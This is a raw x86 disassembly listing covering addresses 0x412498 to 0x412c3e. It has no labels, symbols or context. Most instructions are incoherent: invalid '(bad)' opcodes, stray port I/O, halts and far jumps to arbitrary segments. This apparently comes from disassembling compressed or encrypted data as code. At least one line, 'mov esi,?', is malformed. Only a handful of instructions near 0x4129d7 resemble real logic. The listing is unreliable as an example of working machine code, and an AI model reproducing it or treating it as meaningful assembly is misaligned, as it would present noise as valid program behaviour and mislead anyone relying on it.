  412498:	push   ebp
  412499:	fiadd  WORD PTR [eax+edi*4+0x39449c30]
  4124a0:	push   es
  4124a1:	push   ds
  4124a2:	imul   ecx,DWORD PTR [ebp-0x320b48fe],0xffffffa1
  4124a9:	ror    DWORD PTR [ecx-0x7c161bab],cl
  4124af:	add    al,BYTE PTR [eax]
  4124b1:	add    bh,cl
  4124b3:	ret    
  4124b4:	rol    esi,0xd1
  4124b7:	(bad)  
  4124b8:	fcmovnu st,st(1)
  4124ba:	mov    ebx,0x2d1ebe60
  4124bf:	call   edi
  4124c1:	mov    eax,0x78786e3d
  4124c6:	in     eax,0x7e
  4124c8:	js     0x412542
  4124ca:	xor    BYTE PTR [eax-0x52],cl
  4124cd:	adc    BYTE PTR [edx+0x733d9f8d],al
  4124d3:	mov    ds,WORD PTR [ebp+0x37]
  4124d6:	xchg   esp,eax
  4124d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4124d8:	mov    edi,ss
  4124da:	xchg   esp,eax
  4124db:	cli    
  4124dc:	xor    dh,BYTE PTR [esi+0x504a693a]
  4124e2:	clc    
  4124e3:	neg    BYTE PTR [ebx-0x2a33cc94]
  4124e9:	cmp    eax,0x8e3246b2
  4124ee:	sub    cl,ah
  4124f0:	aaa    
  4124f1:	cld    
  4124f2:	scas   al,BYTE PTR es:[edi]
  4124f3:	arpl   WORD PTR [edx],di
  4124f5:	sbb    dl,bl
  4124f7:	xchg   edx,eax
  4124f8:	cmp    al,0xc9
  4124fa:	clc    
  4124fb:	ins    BYTE PTR es:[edi],dx
  4124fc:	cli    
  4124fd:	das    
  4124fe:	dec    ebx
  4124ff:	dec    ecx
  412500:	mov    ds:0xab5a094,eax
  412505:	and    al,0x8b
  412507:	or     ch,dl
  412509:	push   ss
  41250a:	lods   al,BYTE PTR ds:[esi]
  41250b:	inc    esp
  41250c:	sub    eax,0xb5d7f4d9
  412511:	scas   eax,DWORD PTR es:[edi]
  412512:	mov    cl,0xfd
  412514:	data16 hlt 
  412516:	xchg   esp,edi
  412518:	jmp    0x172c:0x14b4df02
  41251f:	std    
  412520:	inc    esi
  412521:	push   ebx
  412522:	and    bh,BYTE PTR [edi+ecx*2-0x164130f3]
  412529:	sti    
  41252a:	cmp    DWORD PTR [esi],ecx
  41252c:	mov    edx,0x3efa0f02
  412531:	sbb    eax,DWORD PTR [edx+edx*4]
  412534:	stos   BYTE PTR es:[edi],al
  412535:	retf   
  412536:	(bad)  [ebx]
  412538:	sbb    ch,BYTE PTR [eax-0x67]
  41253b:	fsubrp st(6),st
  41253d:	and    eax,0x953c789e
  412542:	ins    BYTE PTR es:[edi],dx
  412543:	ret    0xfeea
  412546:	cmp    eax,0x7971fd07
  41254b:	adc    eax,0x96f589f2
  412550:	sub    eax,0xb49f9d3e
  412555:	add    ah,ah
  412557:	xchg   esi,eax
  412558:	sub    al,0x48
  41255a:	mov    bh,0xaf
  41255c:	jb     0x412581
  41255e:	xor    eax,0x5af45a37
  412563:	adc    al,0x8b
  412565:	push   eax
  412566:	dec    ebp
  412567:	into   
  412568:	cmp    eax,0x99b9f966
  41256d:	push   0xffffffd4
  41256f:	int3   
  412570:	bound  esp,QWORD PTR [eax]
  412572:	enter  0x4cf6,0xf3
  412576:	cmp    eax,0xf31acb96
  41257b:	adc    BYTE PTR [esi+0x50],0xd9
  41257f:	out    0xd6,al
  412581:	mov    eax,DWORD PTR [ebp+0x3a8466d6]
  412587:	dec    esi
  412588:	adc    bl,bl
  41258a:	sahf   
  41258b:	jmp    0x5a1b:0x4643c28
  412592:	test   ax,0x87c2
  412596:	fdiv   QWORD PTR [edx+0x3f]
  412599:	push   edi
  41259a:	mov    ecx,0xbb31016a
  41259f:	enter  0x683b,0x23
  4125a3:	push   eax
  4125a4:	jb     0x412563
  4125a6:	mov    eax,ds:0x8a5342f
  4125ab:	or     eax,0xa9d63529
  4125b0:	fadd   DWORD PTR [eax+0x34]
  4125b3:	pop    edx
  4125b4:	les    esp,FWORD PTR [ecx+ebx*8-0x5b]
  4125b8:	pop    ss
  4125b9:	push   eax
  4125ba:	test   BYTE PTR [ebx+0x5f],al
  4125bd:	or     al,0xef
  4125bf:	fstp   DWORD PTR [ecx-0x5fbfee79]
  4125c5:	out    0x6d,al
  4125c7:	add    ebx,DWORD PTR [edi+0x196f28ee]
  4125cd:	out    dx,al
  4125ce:	bound  esi,QWORD PTR [edi]
  4125d0:	test   BYTE PTR [ecx+0x2e],ah
  4125d3:	dec    esp
  4125d4:	hlt    
  4125d5:	inc    edi
  4125d6:	mov    esp,0x3ab97629
  4125db:	es retf 
  4125dd:	jmp    0x1dd1158a
  4125e2:	pop    ds
  4125e3:	test   BYTE PTR [esi-0x39],cl
  4125e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4125e7:	test   DWORD PTR [ebx],esi
  4125e9:	cs pop esp
  4125eb:	dec    esi
  4125ec:	(bad)  
  4125ed:	(bad)  
  4125ef:	xor    esp,edx
  4125f1:	dec    ecx
  4125f2:	xor    al,0x7e
  4125f4:	aaa    
  4125f5:	loope  0x4125b2
  4125f7:	mov    bl,0x12
  4125f9:	aad    0x4e
  4125fb:	inc    ebx
  4125fc:	jne    0x41258a
  4125fe:	push   ds
  4125ff:	inc    edi
  412600:	in     al,0x24
  412602:	fadd   DWORD PTR [ebp+esi*4-0x72]
  412606:	push   ebp
  412607:	sbb    dl,BYTE PTR [eax]
  412609:	lds    ebp,FWORD PTR [ebx-0x36f8fdae]
  41260f:	pop    es
  412610:	cmp    bl,dh
  412612:	adc    BYTE PTR [eax-0x536e2b21],ch
  412618:	test   eax,0x8b4cb08a
  41261d:	or     BYTE PTR [edx+eiz*8],0x71
  412621:	fstp   st(1)
  412623:	stos   BYTE PTR es:[edi],al
  412624:	retf   
  412625:	mov    ebx,0x278f8fbe
  41262a:	and    cl,BYTE PTR [ebx-0x2e]
  41262d:	mov    bh,0xd2
  41262f:	jg     0x4125c2
  412631:	ret    0xd6e
  412634:	xchg   ecx,eax
  412635:	shl    BYTE PTR [edi],cl
  412637:	mov    esi,0xc67bb568
  41263c:	sar    BYTE PTR [eax-0xcd34f5d],0xda
  412643:	loope  0x41263d
  412645:	test   DWORD PTR [ecx+eiz*4-0x64faac26],eax
  41264c:	push   edx
  41264d:	and    DWORD PTR [eax+0x5bd59a70],eax
  412653:	dec    edx
  412654:	xor    al,BYTE PTR [ecx+0x18]
  412657:	mov    bl,0xe1
  412659:	loop   0x412676
  41265b:	adc    DWORD PTR [edx+eax*8+0x34540e6b],ebp
  412662:	in     al,dx
  412663:	fsubrp st(4),st
  412665:	daa    
  412666:	es jecxz 0x41268e
  412669:	hlt    
  41266a:	repz jmp 0x15e9b127
  412670:	loope  0x4126ce
  412672:	adc    al,0x2e
  412674:	cmp    BYTE PTR [ecx-0x1f07c05e],dh
  41267a:	add    eax,0x716ee2af
  41267f:	cmp    eax,0xb7a8a72d
  412684:	les    edx,FWORD PTR [ecx]
  412686:	adc    esp,DWORD PTR ds:0x4bd4c78c
  41268c:	pusha  
  41268d:	outs   dx,BYTE PTR ds:[esi]
  41268e:	cmp    DWORD PTR [ebp-0x58],edi
  412691:	xor    dl,ah
  412693:	mov    edx,0xe4fb4fdf
  412698:	pop    edx
  412699:	imul   ebp,DWORD PTR ds:0x6169fab1,0x57
  4126a0:	ins    DWORD PTR es:[edi],dx
  4126a1:	retf   
  4126a2:	icebp  
  4126a3:	and    al,0x3
  4126a5:	js     0x412632
  4126a7:	xchg   edx,eax
  4126a8:	push   ebp
  4126a9:	xor    bh,BYTE PTR [edx]
  4126ab:	es jmp 0x4126ee
  4126ae:	sbb    BYTE PTR [ebx-0x145f38dc],ch
  4126b4:	mov    WORD PTR [ebx-0x1c],gs
  4126b7:	not    BYTE PTR [ebx-0x58a79b64]
  4126bd:	pop    esi
  4126be:	or     BYTE PTR [esi-0x5c],ah
  4126c1:	sub    eax,0x4fc62d23
  4126c6:	jp     0x41264a
  4126c8:	arpl   cx,dx
  4126ca:	ds lods al,BYTE PTR gs:[si]
  4126ce:	or     BYTE PTR [edi+0x4c],0xbb
  4126d2:	mov    esp,0x2673c1be
  4126d7:	ss cli 
  4126d9:	sbb    eax,0x65ce4ebf
  4126de:	cmp    al,0x46
  4126e0:	mov    al,ds:0x70168e2d
  4126e5:	dec    esp
  4126e6:	sbb    BYTE PTR [ebx+0xb],ah
  4126e9:	mov    bl,0xfd
  4126eb:	lock pusha 
  4126ed:	push   ebx
  4126ee:	xor    cl,bl
  4126f0:	stos   BYTE PTR es:[edi],al
  4126f1:	pop    eax
  4126f2:	pop    esi
  4126f3:	xor    al,0x97
  4126f5:	sub    BYTE PTR [edi+0x20],al
  4126f8:	cmp    al,0x89
  4126fa:	pop    ds
  4126fb:	mov    eax,0x180cb9fc
  412700:	adc    ch,BYTE PTR [ecx+eiz*4+0x34]
  412704:	gs cli 
  412706:	jo     0x4126ac
  412708:	xchg   ebx,eax
  412709:	add    DWORD PTR [ecx],edi
  41270b:	ror    DWORD PTR [edi-0x6995be4f],cl
  412711:	pop    ecx
  412712:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412713:	nop
  412714:	loope  0x4126f6
  412716:	loopne 0x41276c
  412718:	inc    esi
  412719:	in     al,dx
  41271a:	shl    ah,1
  41271c:	sub    BYTE PTR [esi-0x37],ch
  41271f:	(bad)  
  412720:	mov    bl,0x22
  412722:	pop    ebp
  412723:	push   esp
  412724:	mov    bl,0xde
  412726:	mov    al,ds:0x3e67cf05
  41272b:	retf   0xd58f
  41272e:	xor    al,0xc1
  412730:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412731:	sti    
  412732:	or     eax,0x45c73f25
  412737:	hlt    
  412738:	cmp    DWORD PTR [ebp+0x45c7f89c],eax
  41273e:	mov    esp,0xf89c853a
  412743:	jmp    0x4129cb
  412748:	int    0xcb
  41274a:	ror    esp,0xd9
  41274d:	fcmove st,st(5)
  41274f:	leave  
  412750:	sub    al,0xaa
  412752:	(bad)  
  412754:	div    BYTE PTR [ebx+ebp*1-0x10]
  412758:	stos   BYTE PTR es:[edi],al
  412759:	ins    BYTE PTR es:[edi],dx
  41275a:	js     0x4127d4
  41275c:	in     eax,0x7e
  41275e:	js     0x4127d8
  412760:	or     al,BYTE PTR [ecx+eiz*8+0xb]
  412764:	aaa    
  412765:	pushf  
  412766:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412767:	inc    ebp
  412768:	adc    al,0x6e
  41276a:	jmp    0xcf67:0xae0947d0
  412771:	(bad)  
  412772:	iret   
  412773:	add    bl,bl
  412775:	int    0x11
  412777:	jmp    0x80ee:0x72c2909d
  41277e:	xor    ebp,DWORD PTR [edi]
  412780:	mov    ecx,0xea35d6ac
  412785:	mov    ds:0xca55c843,al
  41278a:	ins    DWORD PTR es:[edi],dx
  41278b:	scas   eax,DWORD PTR es:[edi]
  41278c:	jmp    0x5bbd:0x6ac6ca4e
  412793:	or     al,0x32
  412795:	pop    ebp
  412796:	add    esi,ebp
  412798:	call   0xc6f925f1
  41279d:	mov    eax,ds:0x1b3c273f
  4127a2:	mov    al,0x59
  4127a4:	jae    0x4127da
  4127a6:	aaa    
  4127a7:	sub    DWORD PTR [ecx-0x54],edx
  4127aa:	ret    0x561e
  4127ad:	es dec ecx
  4127af:	xchg   edx,eax
  4127b0:	sbb    eax,0xbb270766
  4127b5:	sahf   
  4127b6:	sbb    al,0xc8
  4127b8:	jmp    0x378bd10e
  4127bd:	add    BYTE PTR [eax-0x2d],dh
  4127c0:	dec    ebx
  4127c1:	jp     0x41281c
  4127c3:	cs jecxz 0x4127d2
  4127c6:	dec    ebp
  4127c7:	xchg   edi,eax
  4127c8:	pop    esi
  4127c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127ca:	sar    BYTE PTR [edx],1
  4127cc:	test   eax,ebp
  4127ce:	mov    ebx,0xe497d094
  4127d3:	es icebp 
  4127d5:	push   edi
  4127d6:	dec    edx
  4127d7:	addr16 pop esi
  4127d9:	je     0x4127d2
  4127db:	aas    
  4127dc:	cmp    BYTE PTR [edi],ah
  4127de:	adc    al,0x9
  4127e0:	scas   al,BYTE PTR es:[edi]
  4127e1:	jl     0x412796
  4127e3:	pop    es
  4127e4:	in     eax,0xea
  4127e6:	jo     0x4127aa
  4127e8:	test   eax,0xf3983b3b
  4127ed:	sti    
  4127ee:	adc    BYTE PTR [ecx+0x3f],bl
  4127f1:	jbe    0x4127d4
  4127f3:	xor    DWORD PTR [eax],esi
  4127f5:	mov    eax,0x76a4d640
  4127fa:	pop    ebx
  4127fb:	ffree  st(0)
  4127fd:	and    eax,0xc4bee174
  412802:	pop    esp
  412803:	add    dl,BYTE PTR [edx+0x5aa035b6]
  412809:	and    bl,BYTE PTR [edx+ebp*4]
  41280c:	mov    dh,0xe3
  41280e:	sub    BYTE PTR [eax+ecx*1-0x7e780b8],ch
  412815:	int    0xb6
  412817:	jge    0x412812
  412819:	into   
  41281a:	dec    esp
  41281b:	sahf   
  41281c:	mov    edx,0xb1dad13d
  412821:	repz gs xchg edi,eax
  412824:	sbb    eax,0x8231006d
  412829:	and    al,0xe2
  41282b:	cmc    
  41282c:	push   ss
  41282d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41282e:	inc    edx
  41282f:	xchg   DWORD PTR [edi+0x25],esi
  412832:	sub    al,0xcd
  412834:	fdiv   QWORD PTR [ecx]
  412836:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412837:	mov    ah,BYTE PTR [ecx+0x7f394ea2]
  41283d:	jmp    0x412892
  41283f:	jbe    0x4128b9
  412841:	inc    ecx
  412842:	int    0xb
  412844:	push   eax
  412845:	or     al,0xdc
  412847:	rcr    ebx,0xe1
  41284a:	mov    ebp,DWORD PTR [ebp-0x4e]
  41284d:	fdivr  QWORD PTR [edi-0x1f]
  412850:	mov    al,0x52
  412852:	pop    ss
  412853:	push   cs
  412854:	jo     0x412892
  412856:	xchg   bh,bh
  412858:	div    DWORD PTR [edx]
  41285a:	mov    ss,WORD PTR [edi+0x78]
  41285d:	cmp    eax,0xd3e34db4
  412862:	xor    eax,0x8758434c
  412867:	sub    DWORD PTR [edi+eiz*2+0x7689ef9b],ecx
  41286e:	push   eax
  41286f:	cmp    DWORD PTR [esi],edi
  412871:	cmp    esp,DWORD PTR [esi+0x2b]
  412874:	pop    edi
  412875:	inc    esp
  412876:	test   BYTE PTR [edx-0x351add95],ah
  41287c:	jmp    0x83f6:0x5c8292a3
  412883:	xchg   ebp,eax
  412884:	jno    0x41280c
  412886:	sub    eax,0x5300d541
  41288b:	xchg   DWORD PTR [edx+ecx*8+0x204478b],ebp
  412892:	and    BYTE PTR [ebx-0x5d],0x1e
  412896:	xchg   DWORD PTR [ecx+ebp*2-0x7d8ef99f],ecx
  41289d:	xlat   BYTE PTR ds:[ebx]
  41289e:	cld    
  41289f:	push   ds
  4128a0:	mov    ch,0x46
  4128a2:	mov    edi,0x9835dae0
  4128a7:	dec    ebp
  4128a8:	sbb    DWORD PTR [ecx+ecx*2+0x1],eax
  4128ac:	add    BYTE PTR [esp+ebx*4-0x7703fad6],al
  4128b3:	rcl    BYTE PTR [edx-0x58],cl
  4128b6:	xchg   esi,eax
  4128b7:	inc    ebp
  4128b8:	xchg   esp,eax
  4128b9:	(bad)  
  4128ba:	push   ecx
  4128bb:	push   ecx
  4128bc:	stos   DWORD PTR es:[edi],eax
  4128bd:	xchg   esp,eax
  4128be:	inc    edi
  4128bf:	mov    cl,0x98
  4128c1:	fwait
  4128c2:	mov    eax,0xa712f284
  4128c7:	call   0x8177:0x9d6dab67
  4128ce:	(bad)  
  4128cf:	cmp    al,0x40
  4128d1:	lods   al,BYTE PTR ds:[esi]
  4128d2:	test   BYTE PTR [esi],0xba
  4128d5:	or     bl,BYTE PTR [ebx+0x51e9db75]
  4128db:	push   0x229a4420
  4128e0:	mov    esi,0x3a82c022
  4128e5:	pop    esp
  4128e6:	enter  0x560a,0x72
  4128ea:	loop   0x4128c6
  4128ec:	gs (bad) 
  4128ee:	xchg   ecx,eax
  4128ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128f0:	dec    ebp
  4128f1:	test   DWORD PTR [edx],edx
  4128f3:	or     dl,BYTE PTR [esi+ecx*8+0x16]
  4128f7:	fmul   QWORD PTR [esi]
  4128f9:	pop    edx
  4128fa:	sub    ebp,DWORD PTR [edx-0x3483b7cd]
  412900:	aam    0xc1
  412902:	jo     0x412979
  412904:	add    eax,ebx
  412906:	rcr    BYTE PTR [ebp+eax*8+0x72],1
  41290a:	arpl   dx,si
  41290c:	clc    
  41290d:	repz mov ds:0xc1a37363,eax
  412913:	push   ds
  412914:	shl    edx,0x20
  412917:	ret    
  412918:	cmp    BYTE PTR [ebx-0x48],bl
  41291b:	xchg   ecx,esi
  41291d:	pop    ecx
  41291e:	jo     0x412996
  412920:	adc    eax,0x21598ccb
  412925:	fbstp  TBYTE PTR [edx]
  412927:	inc    ebp
  412928:	push   ss
  412929:	and    DWORD PTR [ecx+0xa51ee83],esi
  41292f:	sar    DWORD PTR [ebx],cl
  412931:	add    eax,0x6649aff6
  412936:	jae    0x4128f7
  412938:	jo     0x412915
  41293a:	push   ds
  41293b:	les    ecx,FWORD PTR [eax-0x6549b06f]
  412941:	adc    ch,bh
  412943:	into   
  412944:	call   0x9415:0x543ebf5e
  41294b:	retf   
  41294c:	test   BYTE PTR [eax],0x86
  41294f:	ret    
  412950:	cmp    al,0x71
  412953:	fstp   TBYTE PTR [edx+edi*8-0x57]
  412957:	lods   eax,DWORD PTR ds:[esi]
  412958:	sbb    DWORD PTR [esi],ecx
  41295a:	fistp  QWORD PTR [ebp+0x46]
  41295d:	jle    0x4129a6
  41295f:	mov    edx,0x4c80f09b
  412964:	es push cs
  412966:	pop    edx
  412967:	adc    al,0x8c
  412969:	and    ebx,DWORD PTR [edx+0x22]
  41296c:	cmp    bl,BYTE PTR [ecx]
  41296e:	mov    esp,0x676b99a4
  412973:	mov    ch,0x2b
  412975:	xchg   ecx,eax
  412976:	or     ebx,DWORD PTR [edi+0x3693974a]
  41297c:	ror    ecx,1
  41297e:	ja     0x41292d
  412980:	sbb    DWORD PTR [ebx-0x7f],ebx
  412983:	mov    esp,0x807d8314
  412988:	cwde   
  412989:	adc    al,0x87
  41298b:	mov    bh,dh
  41298d:	out    0x53,eax
  41298f:	nop
  412990:	mov    eax,0xcab1543b
  412995:	and    DWORD PTR [esi],ebp
  412997:	cmp    eax,DWORD PTR [esp+ecx*4+0x21]
  41299b:	adc    dl,BYTE PTR [eax-0x5b]
  41299e:	inc    ebp
  41299f:	ins    DWORD PTR es:[edi],dx
  4129a0:	iret   
  4129a1:	sbb    BYTE PTR [ebx-0x279f98e2],0x1c
  4129a8:	and    eax,0x503706b4
  4129ad:	or     esp,DWORD PTR [edi+0x49c273e9]
  4129b3:	push   ebp
  4129b4:	sbb    BYTE PTR [ecx-0x45],ch
  4129b7:	mov    bl,0x0
  4129b9:	fnstsw WORD PTR [esi+0x59494a8c]
  4129bf:	xchg   ebx,eax
  4129c0:	or     dh,bl
  4129c2:	ret    
  4129c3:	jmp    0x412952
  4129c5:	inc    esp
  4129c6:	aad    0xa5
  4129c8:	imul   ecx,DWORD PTR [eax-0x3],0xffffff8b
  4129cc:	push   ebp
  4129cd:	call   0xd144fa05
  4129d2:	jmp    0x41396f
  4129d7:	mov    edx,DWORD PTR [ebp-0x18]
  4129da:	xor    edx,eax
  4129dc:	add    edx,DWORD PTR [ebp-0x14]
  4129df:	jmp    0x412c67
  4129e4:	(bad)
  4129e7:	ret    0xc1ca
  4129ea:	(bad)
  4129ed:	xlat   BYTE PTR ds:[ebx]
  4129ee:	data16 ja 0x412a0e
  4129f1:	cmp    ebx,DWORD PTR [edi]
  4129f3:	sbb    eax,0x78787117
  4129f8:	in     eax,0x7e
  4129fa:	js     0x412a74
  4129fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129fd:	sub    dh,dh
  4129ff:	fdivp  st(4),st
  412a01:	pop    eax
  412a02:	add    al,0xe6
  412a04:	ds pop eax
  412a06:	leave  
  412a07:	push   edx
  412a08:	adc    DWORD PTR [edi],ecx
  412a0a:	(bad)  
  412a0b:	pop    ebx
  412a0c:	push   eax
  412a0d:	jmp    0xfb2441d4
  412a12:	jbe    0x412a46
  412a14:	or     bh,BYTE PTR [ecx-0x68]
  412a17:	test   DWORD PTR [ebp-0x6f],ebp
  412a1a:	xchg   ecx,eax
  412a1b:	into   
  412a1c:	cs push cs
  412a1e:	pop    ecx
  412a1f:	hlt    
  412a20:	push   edx
  412a21:	inc    DWORD PTR [eax]
  412a23:	add    ecx,DWORD PTR [edx]
  412a25:	lds    ebx,FWORD PTR [edx-0x69]
  412a28:	push   ebx
  412a29:	jb     0x412a95
  412a2b:	and    ecx,DWORD PTR [esi+eiz*8]
  412a2e:	jns    0x412a50
  412a30:	push   0x46
  412a32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a33:	and    bh,dh
  412a35:	rcr    BYTE PTR [eax-0x5bb9f80a],1
  412a3b:	in     al,dx
  412a3c:	sbb    DWORD PTR [ecx-0x7346b596],ecx
  412a42:	popa   
  412a43:	mov    ah,0xc4
  412a45:	ror    DWORD PTR [edx],1
  412a47:	push   edx
  412a48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a49:	cmp    ch,BYTE PTR [ecx]
  412a4b:	(bad)  
  412a4c:	jle    0x412a79
  412a4e:	mov    BYTE PTR [edi],ch
  412a50:	enter  0x19e8,0x83
  412a54:	xor    eax,DWORD PTR [edi-0x20]
  412a57:	pop    ss
  412a58:	sar    bl,1
  412a5a:	(bad)  
  412a5b:	aam    0xb
  412a5d:	arpl   WORD PTR [edx+0x61],ax
  412a60:	inc    ebp
  412a61:	aas    
  412a62:	out    0x2a,eax
  412a64:	mov    gs,WORD PTR [esi-0x36]
  412a67:	or     ebx,eax
  412a69:	and    BYTE PTR ds:0x32f59196,0xd8
  412a70:	or     dl,al
  412a72:	sub    dh,BYTE PTR [eax+ebx*1+0xe]
  412a76:	pop    esp
  412a77:	adc    cl,ch
  412a79:	loope  0x412ad4
  412a7b:	das    
  412a7c:	adc    esi,DWORD PTR [ecx]
  412a7e:	cmp    BYTE PTR [ecx-0x4ce5abd8],cl
  412a84:	and    al,0x2b
  412a86:	je     0x412aec
  412a88:	iret   
  412a89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a8a:	fistp  WORD PTR [edi+0x2995d31d]
  412a90:	fs mov bh,0x35
  412a93:	cmp    esi,eax
  412a95:	push   0x7d
  412a97:	cmp    DWORD PTR [ecx+0x1d],edi
  412a9a:	and    dh,BYTE PTR [edx+0x11]
  412a9d:	lahf   
  412a9e:	inc    edi
  412a9f:	jp     0x412a49
  412aa1:	aaa    
  412aa2:	jae    0x412a5d
  412aa4:	xor    ch,BYTE PTR [edx-0x26]
  412aa7:	clc    
  412aa8:	lods   al,BYTE PTR ds:[esi]
  412aa9:	and    al,0x6a
  412aab:	inc    edx
  412aac:	fidivr DWORD PTR [eax+0x2d]
  412aaf:	and    eax,0xb9c8533e
  412ab4:	cmp    eax,DWORD PTR [edi+0x75ecce6a]
  412aba:	mov    edi,0x70046dc0
  412abf:	dec    DWORD PTR [ebx-0xd]
  412ac2:	dec    esp
  412ac3:	mov    dl,0x3e
  412ac5:	xchg   edx,eax
  412ac6:	mov    BYTE PTR [ecx+0x7d33c9c8],bl
  412acc:	test   al,0xa7
  412ace:	cdq    
  412acf:	aam    0x3
  412ad1:	repnz add eax,0x5fe556ad
  412ad7:	sub    DWORD PTR [edi+0x71b65c28],ebx
  412add:	mov    dh,0x8c
  412adf:	cli    
  412ae0:	and    al,0x36
  412ae2:	inc    esp
  412ae3:	mov    bl,BYTE PTR [edx]
  412ae5:	loope  0x412b30
  412ae7:	jae    0x412ae6
  412ae9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412aea:	popf   
  412aeb:	pusha  
  412aec:	data16 rcr BYTE PTR [ecx+eax*8-0x2d],cl
  412af1:	dec    esi
  412af2:	push   ds
  412af3:	inc    edi
  412af4:	dec    esp
  412af5:	xchg   BYTE PTR [ebp-0x19],dh
  412af8:	pop    ecx
  412af9:	mov    esi,?
  412afb:	pop    ds
  412afc:	jo     0x412b40
  412afe:	mov    DWORD PTR [eax],eax
  412b00:	mov    edx,ebx
  412b02:	xor    eax,0xfd706bf6
  412b07:	push   esi
  412b08:	xchg   DWORD PTR [ebp+eiz*2-0x7bc6dad9],ebx
  412b0f:	sbb    DWORD PTR [edi+0x622384e1],ebx
  412b15:	bound  eax,QWORD PTR [edx]
  412b17:	inc    esp
  412b18:	xchg   ecx,eax
  412b19:	mov    cl,0x52
  412b1b:	and    edx,esp
  412b1d:	mov    edi,es
  412b1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b20:	cmp    eax,0x8f88dc9e
  412b25:	xor    BYTE PTR [edx],bh
  412b27:	retf   
  412b28:	fcomp  QWORD PTR [ecx+esi*4-0x41]
  412b2c:	dec    edx
  412b2d:	dec    esp
  412b2e:	push   ecx
  412b2f:	push   0x7842ea6b
  412b34:	jecxz  0x412aef
  412b36:	pop    ss
  412b37:	xchg   DWORD PTR [ebp-0x6e],ebp
  412b3a:	mov    esi,0x28966535
  412b3f:	and    BYTE PTR [eax-0x39],dl
  412b42:	pushf  
  412b43:	xchg   edx,eax
  412b44:	mov    ch,0xbb
  412b46:	or     BYTE PTR [edx-0x47],dh
  412b49:	jp     0x412b5a
  412b4b:	enter  0xf0c,0x3f
  412b4f:	les    ebp,FWORD PTR [esi+0x73]
  412b52:	push   esi
  412b53:	jo     0x412b7d
  412b55:	call   0x46aafff5
  412b5a:	mov    esi,0x5deb1877
  412b5f:	pusha  
  412b60:	jae    0x412ba6
  412b62:	into   
  412b63:	retf   0x2514
  412b66:	jl     0x412bc8
  412b68:	sbb    ch,BYTE PTR [eax]
  412b6a:	int    0x30
  412b6c:	jg     0x412b80
  412b6e:	cdq    
  412b6f:	test   edi,edi
  412b71:	ja     0x412b19
  412b73:	adc    dh,BYTE PTR [esp+ebx*8-0x7cc9b68]
  412b7a:	(bad)  
  412b7b:	cli    
  412b7c:	push   edi
  412b7d:	aam    0x67
  412b7f:	sbb    ecx,DWORD PTR [esi]
  412b81:	xor    edi,eax
  412b83:	mov    bh,0x8a
  412b85:	les    edi,FWORD PTR [eax+edi*2-0xb]
  412b89:	aaa    
  412b8a:	sbb    DWORD PTR [edx+0x48],ecx
  412b8d:	sub    al,0x53
  412b8f:	in     eax,0xb3
  412b91:	mov    dh,0xe1
  412b93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b94:	leave  
  412b95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b97:	popf   
  412b98:	mov    DWORD PTR [esi+0x7a554522],edx
  412b9e:	jns    0x412bd2
  412ba0:	pop    ebx
  412ba1:	icebp  
  412ba2:	mov    ch,0x41
  412ba4:	test   BYTE PTR [eax],cl
  412ba6:	fidiv  DWORD PTR [ecx]
  412ba8:	vpminsw xmm7,xmm1,xmm2
  412bac:	(bad)  
  412bad:	jge    0x412c2c
  412baf:	fld    TBYTE PTR [ebp+0x48]
  412bb2:	pusha  
  412bb3:	push   edi
  412bb4:	popa   
  412bb5:	inc    edx
  412bb6:	arpl   di,cx
  412bb8:	and    esi,DWORD PTR [edi+edi*2+0x38bb4833]
  412bbf:	jmp    0x412bb4
  412bc1:	adc    DWORD PTR [edi+0x7dc68f34],esp
  412bc7:	add    al,BYTE PTR [esi+ebp*1-0x3f]
  412bcb:	stc    
  412bcc:	push   edi
  412bcd:	popa   
  412bce:	ja     0x412c19
  412bd0:	jns    0x412b90
  412bd2:	or     dl,BYTE PTR [ecx+eax*4]
  412bd5:	cwde   
  412bd6:	sar    BYTE PTR [edx-0xb],cl
  412bd9:	sahf   
  412bda:	xchg   edi,eax
  412bdb:	daa    
  412bdc:	lds    edx,FWORD PTR [eax+0x7dbf209e]
  412be2:	jp     0x412c2d
  412be4:	daa    
  412be5:	jae    0x412b6c
  412be7:	and    BYTE PTR [eax+edx*8+0x39],bh
  412beb:	les    eax,FWORD PTR [esi]
  412bed:	aas    
  412bee:	mov    ds:0xdca010e4,eax
  412bf3:	push   cs
  412bf4:	add    al,0x70
  412bf6:	call   DWORD PTR [eax-0x4d]
  412bf9:	sub    DWORD PTR [ecx+0x22],edx
  412bfc:	(bad)  
  412bfd:	mov    al,0x3b
  412bff:	pusha  
  412c00:	pop    edx
  412c01:	push   ebp
  412c02:	sub    BYTE PTR [edi-0x409be78d],al
  412c08:	and    edx,DWORD PTR [eax+0x6]
  412c0b:	test   eax,0xfec23ccd
  412c10:	add    al,0x2b
  412c12:	dec    ebp
  412c13:	push   esi
  412c14:	mov    esi,0xf75cd8e9
  412c19:	in     al,0x1b
  412c1b:	inc    esp
  412c1c:	dec    eax
  412c1d:	or     al,0x94
  412c1f:	sbb    DWORD PTR [esi-0x5913da36],esp
  412c25:	bound  esp,QWORD PTR [ebx-0x3bb07f14]
  412c2b:	jae    0x412c7a
  412c2d:	lods   al,BYTE PTR ds:[esi]
  412c2e:	in     al,dx
  412c2f:	and    al,0xa9
  412c31:	fisubr WORD PTR [esi-0x7410168b]
  412c37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c38:	cs sbb eax,edi
  412c3b:	pop    esp
  412c3c:	xchg   eax,edi
  412c3e:	retf   
